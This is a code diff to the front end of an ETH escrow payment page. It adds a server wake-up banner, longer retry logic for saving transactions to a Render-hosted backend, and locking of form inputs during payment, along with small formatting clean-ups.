@@ -149,7 +149,6 @@ input:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(1
 }
 .chain-warning.show { display: block; }
 
-/* ── Min limit badge ── */
 .limit-badge {
   display: inline-block;
   background: #e74c3c;
@@ -169,14 +168,23 @@ input:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(1
   0%, 100% { opacity: 1; }
   50%       { opacity: 0.45; }
 }
-.limit-badge.loaded {
-  background: #e74c3c;
-  animation: none;
-}
+.limit-badge.loaded { background: #e74c3c; animation: none; }
 
-/* ============================================================
-   PAYMENT MODAL
-   ============================================================ */
+/* server status banner */
+.server-banner {
+  display: none;
+  background: #fff3cd;
+  border: 1px solid #ffc107;
+  border-radius: 8px;
+  padding: 10px 14px;
+  margin-bottom: 12px;
+  font-size: 13px;
+  color: #856404;
+  text-align: center;
+}
+.server-banner.show { display: block; }
+
+/* PAYMENT MODAL */
 .tx-modal {
   position: fixed;
   inset: 0;
@@ -335,11 +343,16 @@ input:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(1
 <div class="container">
   <div class="logo">🔒</div>
   <h1>Secure Payment Gateway</h1>
-  <div class="subtitle">Privacy-first · ETH only · Ethereum &amp; Sepolia</div>
+  <div class="subtitle">Privacy-first &middot; ETH only &middot; Ethereum &amp; Sepolia</div>
 
   <div class="security-badge">
     <h3>🛡️ ETH Transfers Only</h3>
-    <p>Ethereum Mainnet &amp; Sepolia Testnet · Instant · Secure · Private</p>
+    <p>Ethereum Mainnet &amp; Sepolia Testnet &middot; Instant &middot; Secure &middot; Private</p>
+  </div>
+
+  <!-- server wake-up banner -->
+  <div id="serverBanner" class="server-banner">
+    ⏳ Server is waking up (free tier) — this takes up to 50 seconds. Please wait before sending...
   </div>
 
   <div id="statusBox" class="status-box">
@@ -393,7 +406,7 @@ input:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(1
         <h4>💰 Payment Breakdown</h4>
         <div class="fee-row"><span>You Send:</span><span id="youSend">0 ETH</span></div>
         <div class="fee-row"><span>Platform Fee (<span id="feePercLabel">1</span>%):</span><span id="platformFee">0 ETH</span></div>
-        <div class="fee-row"><span>Gas:</span><span id="forwardGas">0 ETH</span></div>
+        <div class="fee-row"><span>Gas Reserve:</span><span id="forwardGas">0 ETH</span></div>
         <div class="fee-row total"><span>Total from Your Wallet:</span><span id="totalDeduction">0 ETH</span></div>
       </div>
 
@@ -446,12 +459,12 @@ input:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(1
 
 <script>
 const CONFIG = {
-  ESCROW_WALLET:     '0x7e4692aaa29fe7632fa0bdc8effd25cc70867d33',
-  FEE_PERCENTAGE:    1,
-  MIN_TX_AMOUNT_ETH: 0.000001,
-  MAX_TX_AMOUNT_ETH: null,
-  GAS_BUFFER_WEI:    null,
-  GAS_BUFFER_ETH:    null,
+  ESCROW_WALLET:      '0x7e4692aaa29fe7632fa0bdc8effd25cc70867d33',
+  FEE_PERCENTAGE:     1,
+  MIN_TX_AMOUNT_ETH:  0.000001,
+  MAX_TX_AMOUNT_ETH:  null,
+  GAS_BUFFER_WEI:     null,
+  GAS_BUFFER_ETH:     null,
   GAS_PRICE_CAP_GWEI: null,
   BACKEND_URL: 'https://secure-payment-api-824h.onrender.com/api'
 };
@@ -461,12 +474,51 @@ const CHAIN_NAMES    = { '0x1': 'Ethereum Mainnet', '0xaa36a7': 'Sepolia Testnet
 const EXPLORER_BASE  = { '0x1': 'https://etherscan.io/tx/', '0xaa36a7': 'https://sepolia.etherscan.io/tx/' };
 const GAS_UNITS      = 21000;
 
+// ── Retry delays for backend save (handles Render free-tier cold start ~50s)
+// Attempt 0 = immediate, 1 = after 8s, 2 = after 20s, 3 = after 35s
+const SAVE_RETRY_DELAYS = [0, 8000, 20000, 35000];
+
 let currentAccount    = null;
 let currentChainId    = null;
 let monitoringActive  = false;
 let liveGasPriceWei   = null;
 let currentBalanceWei = 0n;
 let configLoaded      = false;
+let serverReady       = false;
+
+// ─────────────────────────────────────────────────────────────
+// SERVER WAKE-UP — ping /health on page load, show banner if slow
+// ─────────────────────────────────────────────────────────────
+async function wakeUpServer() {
+  const banner = document.getElementById('serverBanner');
+  const start  = Date.now();
+  let woken    = false;
+
+  // Show banner after 3s if server not yet responding
+  const bannerTimer = setTimeout(() => {
+    if (!woken) banner.classList.add('show');
+  }, 3000);
+
+  for (let i = 0; i < 8; i++) {
+    try {
+      const r = await fetch(CONFIG.BACKEND_URL + '/health', { cache: 'no-store' });
+      if (r.ok) {
+        woken = true;
+        clearTimeout(bannerTimer);
+        banner.classList.remove('show');
+        serverReady = true;
+        const ms = Date.now() - start;
+        console.log('[server] ready in', ms, 'ms');
+        return;
+      }
+    } catch(e) { /* still sleeping */ }
+    await new Promise(r => setTimeout(r, 7000));
+  }
+  // Give up after ~56s — server may be down
+  clearTimeout(bannerTimer);
+  banner.textContent = '⚠️ Server may be offline. Your ETH transactions will still appear on-chain.';
+  banner.classList.add('show');
+}
 
 // ─────────────────────────────────────────────────────────────
 // BADGE HELPERS
@@ -489,12 +541,10 @@ function setBadgeValue(minEth) {
   if (inp) inp.min = String(minEth);
 }
 
-function setBadgeFallback() {
-  setBadgeValue(CONFIG.MIN_TX_AMOUNT_ETH);
-}
+function setBadgeFallback() { setBadgeValue(CONFIG.MIN_TX_AMOUNT_ETH); }
 
 // ─────────────────────────────────────────────────────────────
-// GAS BUFFER LOGIC
+// GAS BUFFER
 // ─────────────────────────────────────────────────────────────
 function resolveGasBuffer() {
   let capGasWei = null;
@@ -517,10 +567,7 @@ function resolveGasBuffer() {
     useWei = 0n;
   }
 
-  return {
-    gasWei: useWei,
-    gasEth: Number(useWei) / 1e18,
-  };
+  return { gasWei: useWei, gasEth: Number(useWei) / 1e18 };
 }
 
 // ─────────────────────────────────────────────────────────────
@@ -528,29 +575,25 @@ function resolveGasBuffer() {
 // ─────────────────────────────────────────────────────────────
 async function loadBackendConfig() {
   setBadgeLoading();
-  const timeout = new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), 8000));
   try {
     const res = await Promise.race([
       fetch(CONFIG.BACKEND_URL + '/config'),
-      timeout
+      new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), 10000))
     ]);
-    if (!res.ok) throw new Error('non-ok response');
+    if (!res.ok) throw new Error('non-ok');
     const cfg = await res.json();
-
     if (cfg.fee_percentage       != null) CONFIG.FEE_PERCENTAGE       = cfg.fee_percentage;
     if (cfg.min_tx_amount_eth    != null) CONFIG.MIN_TX_AMOUNT_ETH    = cfg.min_tx_amount_eth;
     if (cfg.gas_buffer_wei       != null) CONFIG.GAS_BUFFER_WEI       = cfg.gas_buffer_wei;
     if (cfg.gas_buffer_eth       != null) CONFIG.GAS_BUFFER_ETH       = cfg.gas_buffer_eth;
     if (cfg.gas_price_cap_gwei   != null) CONFIG.GAS_PRICE_CAP_GWEI   = cfg.gas_price_cap_gwei;
-
     const feeLabel = document.getElementById('feePercLabel');
     if (feeLabel) feeLabel.textContent = CONFIG.FEE_PERCENTAGE;
-
     configLoaded = true;
     setBadgeValue(CONFIG.MIN_TX_AMOUNT_ETH);
-    console.log('[config loaded from backend]', cfg);
+    console.log('[config loaded]', cfg);
   } catch (e) {
-    console.warn('[config] Backend unreachable, using default:', e.message);
+    console.warn('[config] fallback:', e.message);
     configLoaded = true;
     setBadgeFallback();
   }
@@ -569,7 +612,7 @@ function enforceAllowedChain() {
 }
 
 // ─────────────────────────────────────────────────────────────
-// GAS PRICE
+// GAS
 // ─────────────────────────────────────────────────────────────
 function refreshGasPrice() {
   if (!window.ethereum) return;
@@ -638,11 +681,9 @@ function refreshBalance() {
 function calculateFees() {
   const amt = parseFloat(document.getElementById('amount').value) || 0;
   if (amt <= 0) { document.getElementById('feeBreakdown').style.display = 'none'; return; }
-
-  const fee = amt * CONFIG.FEE_PERCENTAGE / 100;
-  const gas = resolveGasBuffer();
+  const fee   = amt * CONFIG.FEE_PERCENTAGE / 100;
+  const gas   = resolveGasBuffer();
   const total = amt + fee + gas.gasEth;
-
   document.getElementById('youSend').textContent        = amt.toFixed(6)        + ' ETH';
   document.getElementById('platformFee').textContent    = fee.toFixed(6)        + ' ETH';
   document.getElementById('forwardGas').textContent     = gas.gasEth.toFixed(6) + ' ETH';
@@ -660,7 +701,6 @@ function openModal(to, amountEth, network) {
   document.getElementById('modalAmount').textContent  = amountEth ? amountEth + ' ETH' : '-';
   document.getElementById('modalNetwork').textContent = network    || '-';
   document.getElementById('modalRef').textContent     = '-';
-
   document.getElementById('spinRing').classList.remove('hidden');
   document.getElementById('modalIconInner').textContent = '💸';
   document.getElementById('modalIconInner').classList.remove('animate');
@@ -671,7 +711,6 @@ function openModal(to, amountEth, network) {
   document.getElementById('refRow').classList.remove('show');
   document.getElementById('modalBtn').classList.remove('show', 'success', 'fail', 'warn');
   document.getElementById('explorerLink').classList.remove('show');
-
   document.getElementById('txModal').classList.remove('hidden');
 }
 
@@ -679,11 +718,9 @@ function finalizeModal(success, txHash, opts) {
   opts = opts || {};
   document.getElementById('spinRing').classList.add('hidden');
   document.getElementById('progressBarWrap').classList.add('hidden');
-
   const iconInner = document.getElementById('modalIconInner');
   void iconInner.offsetWidth;
   iconInner.classList.add('animate');
-
   const btn = document.getElementById('modalBtn');
 
   if (success) {
@@ -697,7 +734,7 @@ function finalizeModal(success, txHash, opts) {
     iconInner.textContent      = '⛽';
     iconInner.style.background = 'linear-gradient(135deg,#fff3cd,#ffe08a)';
     document.getElementById('modalTitle').textContent    = 'Queued (Gas High)';
-    document.getElementById('modalSubtitle').textContent = 'Gas prices are above our cap right now. Your transaction is safely queued and will forward automatically when gas drops.';
+    document.getElementById('modalSubtitle').textContent = 'Gas prices are above our cap. Your transaction is safely queued and will forward automatically when gas drops.';
     btn.textContent = 'OK, I\'ll wait';
     btn.classList.add('show', 'warn');
   } else if (opts.trackingError) {
@@ -732,7 +769,6 @@ function finalizeModal(success, txHash, opts) {
 function closeTxModal() {
   document.getElementById('txModal').classList.add('hidden');
   monitoringActive = false;
-  // Always re-enable the payment button when modal closes
   const btn = document.getElementById('paymentBtn');
   if (btn) btn.disabled = !ALLOWED_CHAINS.has(currentChainId);
   refreshBalance();
@@ -740,29 +776,35 @@ function closeTxModal() {
 window.closeTxModal = closeTxModal;
 
 // ─────────────────────────────────────────────────────────────
-// SAVE TX TO BACKEND — with 2 retries
+// SAVE TX TO BACKEND
+// Retries at 0s, 8s, 20s, 35s to survive Render free-tier cold start (~50s)
 // ─────────────────────────────────────────────────────────────
-async function saveTxToBackend(saveData, retries) {
-  retries = (retries === undefined) ? 2 : retries;
-  for (let attempt = 0; attempt <= retries; attempt++) {
+async function saveTxToBackend(saveData) {
+  let lastErr;
+  for (let i = 0; i < SAVE_RETRY_DELAYS.length; i++) {
+    if (i > 0) {
+      const delay = SAVE_RETRY_DELAYS[i];
+      document.getElementById('modalSubtitle').textContent =
+        'Server is waking up... retrying in ' + (delay/1000) + 's (attempt ' + (i+1) + '/' + SAVE_RETRY_DELAYS.length + ')';
+      await new Promise(r => setTimeout(r, delay));
+      document.getElementById('modalSubtitle').textContent = 'Registering with server... (attempt ' + (i+1) + '/' + SAVE_RETRY_DELAYS.length + ')';
+    }
     try {
       const r = await fetch(CONFIG.BACKEND_URL + '/transaction', {
         method:  'POST',
         headers: { 'Content-Type': 'application/json' },
-        body:    JSON.stringify(saveData)
+        body:    JSON.stringify(saveData),
+        signal:  AbortSignal.timeout(12000)
       });
       const json = await r.json();
       if (!r.ok) throw new Error(json.error || ('HTTP ' + r.status));
-      return json; // success
+      return json;
     } catch (e) {
-      console.warn('[saveTx] attempt', attempt + 1, 'failed:', e.message);
-      if (attempt < retries) {
-        await new Promise(res => setTimeout(res, 1500 * (attempt + 1)));
-      } else {
-        throw e; // all retries exhausted
-      }
+      lastErr = e;
+      console.warn('[saveTx] attempt', i + 1, 'failed:', e.message);
     }
   }
+  throw lastErr;
 }
 
 // ─────────────────────────────────────────────────────────────
@@ -770,8 +812,6 @@ async function saveTxToBackend(saveData, retries) {
 // ─────────────────────────────────────────────────────────────
 async function initiatePayment() {
   if (!enforceAllowedChain()) return;
-
-  // Wait for config if still loading
   if (!configLoaded) {
     updateStatus('⏳ Loading config, please wait...', 'processing');
     await loadBackendConfig();
@@ -801,10 +841,8 @@ async function initiatePayment() {
 
   const recipientWei   = BigInt(Math.floor(amount * 1e18));
   const platformFeeWei = BigInt(Math.floor(amount * CONFIG.FEE_PERCENTAGE / 100 * 1e18));
-
-  const gas = resolveGasBuffer();
-  const fwdGasWei = gas.gasWei;
-
+  const gas            = resolveGasBuffer();
+  const fwdGasWei      = gas.gasWei;
   const totalToSendWei = recipientWei + platformFeeWei + fwdGasWei;
 
   refreshBalance();
@@ -815,19 +853,23 @@ async function initiatePayment() {
 
   if (currentBalanceWei < totalToSendWei + tx1GasHeadroom) {
     const shortfall = Number(totalToSendWei + tx1GasHeadroom - currentBalanceWei) / 1e18;
-    document.getElementById('amountError').textContent = 'Insufficient balance — need ~' + shortfall.toFixed(6) + ' more ETH (incl. your tx gas)';
+    document.getElementById('amountError').textContent = 'Insufficient balance — need ~' + shortfall.toFixed(6) + ' more ETH';
     document.getElementById('amountError').style.display = 'block';
     return;
   }
 
-  openModal(dest, amount.toFixed(6), CHAIN_NAMES[currentChainId] || 'Unknown');
+  // Lock form inputs during payment
+  document.getElementById('destinationAddress').disabled = true;
+  document.getElementById('amount').disabled = true;
   document.getElementById('paymentBtn').disabled = true;
+
+  openModal(dest, amount.toFixed(6), CHAIN_NAMES[currentChainId] || 'Unknown');
   updateStatus('⏳ Processing payment...', 'processing');
 
   let _submittedTxHash = null;
 
   try {
-    // ── STEP 1: MetaMask send
+    // ── STEP 1: MetaMask TX1 — user sends ETH to escrow
     const txHash = await window.ethereum.request({
       method: 'eth_sendTransaction',
       params: [{
@@ -838,13 +880,11 @@ async function initiatePayment() {
       }]
     });
 
-    // MetaMask confirmed — tx is on its way
     _submittedTxHash = txHash;
-    console.log('[payment] MetaMask tx submitted:', txHash);
+    console.log('[payment] TX1 submitted:', txHash);
 
-    // Show tx hash in modal immediately so user can track it
-    const shortHash = txHash.slice(0,10) + '...' + txHash.slice(-6);
-    document.getElementById('modalRef').textContent = shortHash;
+    // Show hash immediately so user can track even if save fails
+    document.getElementById('modalRef').textContent = txHash.slice(0,10) + '...' + txHash.slice(-6);
     document.getElementById('refRow').classList.add('show');
     const base = EXPLORER_BASE[currentChainId];
     if (base) {
@@ -852,9 +892,9 @@ async function initiatePayment() {
       link.href = base + txHash;
       link.classList.add('show');
     }
-    document.getElementById('modalSubtitle').textContent = 'Transaction submitted — registering with server...';
+    document.getElementById('modalSubtitle').textContent = 'TX1 confirmed by MetaMask! Registering with server...';
 
-    // ── STEP 2: Save to backend (with retries)
+    // ── STEP 2: Save to backend with retries (handles Render cold start)
     const saveData = {
       tx_hash:                txHash,
       sender:                 currentAccount,
@@ -865,56 +905,52 @@ async function initiatePayment() {
     };
 
     let saved = null;
-    let saveOk = false;
     try {
-      saved  = await saveTxToBackend(saveData);
-      saveOk = true;
-      console.log('[payment] Backend save OK:', saved);
+      saved = await saveTxToBackend(saveData);
+      console.log('[payment] Backend save OK, serial #' + saved.serial_number);
     } catch (saveErr) {
-      // Backend save failed even after retries — tx is still on-chain, just not tracked
-      console.error('[payment] Backend save FAILED after retries:', saveErr.message);
+      console.error('[payment] Backend save FAILED after all retries:', saveErr.message);
       finalizeModal(false, txHash, { trackingError: true });
-      updateStatus('⚠️ Tx sent on-chain — server unreachable. Save your tx hash!', 'processing');
-      return; // don't proceed to monitoring
+      updateStatus('⚠️ TX sent — server unreachable. Save your tx hash!', 'processing');
+      return;
     }
 
     if (saved && saved.client_token) {
       try { sessionStorage.setItem('txToken:' + txHash, saved.client_token); } catch(e) {}
     }
 
-    // ── STEP 3: Clear form, start monitoring
+    // ── STEP 3: Monitor TX status
     monitoringActive = true;
     document.getElementById('destinationAddress').value = '';
     document.getElementById('amount').value = '';
     document.getElementById('feeBreakdown').style.display = 'none';
-    document.getElementById('modalSubtitle').textContent = 'Registered! Monitoring your payment...';
-    updateStatus('⏳ Monitoring payment...', 'processing');
+    document.getElementById('modalSubtitle').textContent = 'Registered! Serial #' + (saved.serial_number || '?') + ' — monitoring...';
+    updateStatus('⏳ Monitoring payment #' + (saved.serial_number || '?') + '...', 'processing');
     setTimeout(() => monitorTx(txHash), 12000);
 
   } catch (err) {
     console.error('[payment] Error:', err);
     if (err.code === 4001 || (err.message && err.message.toLowerCase().includes('rejected'))) {
-      // User rejected in MetaMask — just close modal cleanly
       document.getElementById('txModal').classList.add('hidden');
       updateStatus('⚠️ Payment cancelled by user', 'processing');
     } else if (_submittedTxHash) {
-      // Tx went through but something else failed
       finalizeModal(false, _submittedTxHash, { trackingError: true });
-      updateStatus('⚠️ Tx sent — unexpected error. Save your tx hash!', 'processing');
+      updateStatus('⚠️ TX sent — unexpected error. Save your tx hash!', 'processing');
     } else {
-      // Tx never left — clean failure
       finalizeModal(false, null);
       updateStatus('Payment failed', 'error');
     }
     monitoringActive = false;
   } finally {
-    // ALWAYS re-enable the payment button when done
+    // Always re-enable inputs
+    document.getElementById('destinationAddress').disabled = false;
+    document.getElementById('amount').disabled = false;
     document.getElementById('paymentBtn').disabled = !ALLOWED_CHAINS.has(currentChainId);
   }
 }
 
 // ─────────────────────────────────────────────────────────────
-// MONITOR
+// MONITOR TX2 status
 // ─────────────────────────────────────────────────────────────
 function monitorTx(txHash) {
   if (!monitoringActive) return;
@@ -925,14 +961,12 @@ function monitorTx(txHash) {
     headers: token ? { 'X-Client-Token': token } : {}
   })
   .then(res => {
-    if (!res.ok) {
-      // 404 = not found yet, keep polling
-      if (res.status === 404) {
-        if (monitoringActive) setTimeout(() => monitorTx(txHash), 15000);
-        return;
-      }
-      throw new Error('Status fetch failed: ' + res.status);
+    if (res.status === 404) {
+      // Not found yet — keep polling
+      if (monitoringActive) setTimeout(() => monitorTx(txHash), 15000);
+      return;
     }
+    if (!res.ok) throw new Error('Status fetch failed: ' + res.status);
     return res.json();
   })
   .then(tx => {
@@ -946,17 +980,18 @@ function monitorTx(txHash) {
       monitoringActive = false;
       finalizeModal(false, txHash, { gasWait: true });
       updateStatus('⛽ Queued — waiting for lower gas', 'processing');
-    } else if (s === 'failed' || s === 'forward_failed') {
+    } else if (s === 'failed') {
       monitoringActive = false;
       finalizeModal(false, txHash);
       updateStatus('Payment failed', 'error');
     } else if (s === 'refunded') {
       monitoringActive = false;
-      finalizeModal(false, txHash, { trackingError: false });
+      finalizeModal(false, txHash);
       document.getElementById('modalTitle').textContent    = 'Refunded';
       document.getElementById('modalSubtitle').textContent = 'Gas prices stayed too high. Your funds have been refunded.';
       updateStatus('🔄 Refunded', 'processing');
     } else {
+      // pending / verified / queued / forwarding_pending — keep polling
       setTimeout(() => monitorTx(txHash), 12000);
     }
   })
@@ -993,6 +1028,8 @@ window.initiatePayment = initiatePayment;
 // ON LOAD
 // ─────────────────────────────────────────────────────────────
 window.addEventListener('load', () => {
+  // Wake up Render server immediately + load config
+  wakeUpServer();
   loadBackendConfig();
 
   if (!window.ethereum) return;
